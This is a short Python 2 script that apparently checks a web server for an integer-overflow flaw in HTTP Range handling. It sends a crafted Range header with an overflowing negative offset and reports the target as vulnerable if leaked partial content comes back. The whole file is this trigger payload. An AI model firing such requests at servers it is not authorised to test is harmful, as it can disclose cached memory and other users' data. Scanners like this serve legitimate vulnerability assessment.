#!/usr/bin/env python
# coding:utf-8

import sys
import urllib2
if len(sys.argv) < 2:
    print "%s url" % (sys.argv[0])
    print
    print "eg: python %s http://127.0.0.1:8080/proxy/demo.png" % (sys.argv[0])
    sys.exit()

url = sys.argv[1]

headers = urllib2.urlopen(url, timeout=10).headers
file_len = headers["Content-Length"]
request = urllib2.Request(url)
request.add_header("Range", "bytes=-%d,-9223372036854%d" % (
    int(file_len) + 623, 776000 - (int(file_len) + 623)))
try:
    cacheres = urllib2.urlopen(request, timeout=10)
    if cacheres.code == 206 and "Content-Range" in cacheres.read(2048):
        print "Vulnerable:" + url
except:
    pass
